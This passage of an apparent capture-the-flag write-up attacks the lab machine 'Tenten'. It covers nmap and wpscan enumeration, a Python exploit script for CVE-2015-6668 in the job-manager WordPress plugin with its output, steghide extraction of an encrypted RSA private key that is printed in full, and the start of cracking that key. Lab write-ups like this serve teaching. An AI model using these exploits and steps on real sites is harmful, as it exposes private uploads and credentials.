</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Nmap 7.60 scan initiated Fri Feb 28 10:29:31 2020 as: nmap -sC -sV -oA nmap/tenten 10.10.10.10</span>
Nmap scan report <span style="color:#ff79c6">for</span> tenten.htb <span style="color:#ff79c6">(</span>10.10.10.10<span style="color:#ff79c6">)</span>
Host is up <span style="color:#ff79c6">(</span>0.24s latency<span style="color:#ff79c6">)</span>.
Not shown: <span style="color:#bd93f9">998</span> filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
| ssh-hostkey:
|   <span style="color:#bd93f9">2048</span> ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
|   <span style="color:#bd93f9">256</span> cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
|_  <span style="color:#bd93f9">256</span> 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 <span style="color:#ff79c6">(</span>EdDSA<span style="color:#ff79c6">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span style="color:#ff79c6">((</span>Ubuntu<span style="color:#ff79c6">))</span>
|_http-generator: WordPress 4.7.3
|_http-server-header: Apache/2.4.18 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
|_http-title: Job Portal &amp;<span style="color:#6272a4">#8211; Just another WordPress site</span>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#6272a4"># Nmap done at Fri Feb 28 10:30:05 2020 -- 1 IP address (1 host up) scanned in 33.77 seconds</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="website-exploration">Website Exploration</h1>
<p>There is a job listing, when clicking Apply, we can see an id in the url</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">GET</span> /index.php/jobs/apply/7/ <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
Host<span style="color:#ff79c6">:</span> 10.10.10.10
</code></pre></td></tr></table>
</div>
</div><p>this is eligible for Burp Intruder module &hellip; after visiting the results, we find a page with title <code>HackerAccessGranted</code></p>
<p>Burp running too slow? no problem try this <code>curl -sk http://10.10.10.10/index.php/jobs/apply/8/ | grep &quot;&lt;title&gt;&quot; | cut -d&quot;:&quot; -f2 | cut -d'&amp;' -f1</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;for i in <span style="color:#f1fa8c">`</span>seq <span style="color:#bd93f9">1</span> 20<span style="color:#f1fa8c">`</span>; <span style="color:#ff79c6">do</span> curl -sk http://10.10.10.10/index.php/jobs/apply/<span style="color:#8be9fd;font-style:italic">$i</span>/ | grep <span style="color:#f1fa8c">&#34;&lt;title&gt;&#34;</span> | cut -d<span style="color:#f1fa8c">&#34;:&#34;</span> -f2 | cut -d<span style="color:#f1fa8c">&#39;&amp;&#39;</span> -f1 ;  <span style="color:#ff79c6">done</span>
 Hello world!
 Sample Page
 Auto Draft
&lt;title&gt;Job Application
 Jobs Listing
 Job Application
 Register
 Pen Tester

 Application
 cube
 Application
 HackerAccessGranted
</code></pre></td></tr></table>
</div>
</div><p>or wfuzz <code>wfuzz -z range,1-50 --hh 57555 http://10.10.10.10/index.php/jobs/apply/FUZZ/</code></p>
<h1 id="wpscan">wpscan</h1>
<p>Adding the alias <code>alias wpscan='docker run -it --rm wpscanteam/wpscan'</code></p>
<p>We can wpscan wordpress to enumerate users and plugins</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://10.10.10.10 -e u,p
...
<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> Plugin<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> Identified:

<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> job-manager
 | Location: http://10.10.10.10/wp-content/plugins/job-manager/
 | Latest Version: 0.7.25 <span style="color:#ff79c6">(</span>up to date<span style="color:#ff79c6">)</span>
 ...
<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> User<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> Identified:

<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> takis
 | Found By: Author Posts - Author Pattern <span style="color:#ff79c6">(</span>Passive Detection<span style="color:#ff79c6">)</span>
 | Confirmed By:
 |  Rss Generator <span style="color:#ff79c6">(</span>Passive Detection<span style="color:#ff79c6">)</span>
 |  Wp Json Api <span style="color:#ff79c6">(</span>Aggressive Detection<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>a quick research of job-manager brings us to <a href="https://www.cvedetails.com/cve/CVE-2015-6668/">CVE-2015-6668</a></p>
<p>It is interesting to note that the CVE does not mention 0.7.25 as vulnerable, but it is vulnerable.</p>
<p>We want to try to recover the object <code>HackerAccessGranted</code> but we don&rsquo;t know the extension</p>
<p>A reference to a python exploit <a href="https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/">fetch_uploads.py</a>, allow to download all uploaded files</p>
<p>The website contains entries for April 2017 only so we can modify the years, months and extensions sections of the script:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests

<span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;&#34;&#34;
</span><span style="color:#f1fa8c">CVE-2015-6668
</span><span style="color:#f1fa8c">Title: CV filename disclosure on Job-Manager WP Plugin
</span><span style="color:#f1fa8c">Author: Evangelos Mourikis
</span><span style="color:#f1fa8c">Blog: https://vagmour.eu
</span><span style="color:#f1fa8c">Plugin URL: http://www.wp-jobmanager.com
</span><span style="color:#f1fa8c">Versions: &lt;=0.7.25
</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
website <span style="color:#ff79c6">=</span> raw_input(<span style="color:#f1fa8c">&#39;Enter a vulnerable website: &#39;</span>)
filename <span style="color:#ff79c6">=</span> raw_input(<span style="color:#f1fa8c">&#39;Enter a file name: &#39;</span>)

filename2 <span style="color:#ff79c6">=</span> filename<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34; &#34;</span>, <span style="color:#f1fa8c">&#34;-&#34;</span>)

<span style="color:#ff79c6">for</span> year <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">2017</span>,<span style="color:#bd93f9">2018</span>):
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">4</span>,<span style="color:#bd93f9">5</span>):
        <span style="color:#ff79c6">for</span> extension <span style="color:#ff79c6">in</span> {<span style="color:#f1fa8c">&#39;doc&#39;</span>,<span style="color:#f1fa8c">&#39;pdf&#39;</span>,<span style="color:#f1fa8c">&#39;docx&#39;</span>,<span style="color:#f1fa8c">&#39;jpg&#39;</span>,<span style="color:#f1fa8c">&#39;jpeg&#39;</span>,<span style="color:#f1fa8c">&#39;png&#39;</span>,<span style="color:#f1fa8c">&#39;txt&#39;</span> }:
            URL <span style="color:#ff79c6">=</span> website <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/wp-content/uploads/&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(year) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{:02}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(i) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/&#34;</span> <span style="color:#ff79c6">+</span> filename2 <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;.&#34;</span> <span style="color:#ff79c6">+</span> extension
            req <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(URL)
            <span style="color:#ff79c6">if</span> req<span style="color:#ff79c6">.</span>status_code<span style="color:#ff79c6">==</span><span style="color:#bd93f9">200</span>:
                <span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;[+] URL of CV found! &#34;</span> <span style="color:#ff79c6">+</span> URL
</code></pre></td></tr></table>
</div>
</div><p>We execute the script:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/tenten$ python2 fetch_uploads.py

CVE-2015-6668
Title: CV filename disclosure on Job-Manager WP Plugin
Author: Evangelos Mourikis
Blog: https://vagmour.eu
Plugin URL: http://www.wp-jobmanager.com
Versions: &lt;<span style="color:#ff79c6">=</span>0.7.25

Enter a vulnerable website: http://10.10.10.10
Enter a file name: HackerAccessGranted
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.docx
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.doc
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpeg
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.pdf
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.txt
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.png
ctf@014202efa8c8:~/htb/tenten$ wget http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
</code></pre></td></tr></table>
</div>
</div><p>The image contains some steganography, we use steghide to discover some rsa key</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/tenten$ sudo apt install steghide
ctf@014202efa8c8:~/htb/tenten$ steghide extract -sf HackerAccessGranted.jpg
Enter passphrase:
wrote extracted data to <span style="color:#f1fa8c">&#34;id_rsa&#34;</span>.
ctf@014202efa8c8:~/htb/tenten$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C

/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
-----END RSA PRIVATE KEY-----
</code></pre></td></tr></table>
</div>
</div><p>let&rsquo;s try to ssh with this key
We prepare the SSH key to be cracked with john thanks to <code>ssh2john.py</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/tenten$ wget https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
ctf@014202efa8c8:~/htb/tenten$ python ssh2john.py id_rsa &gt; crack.txt
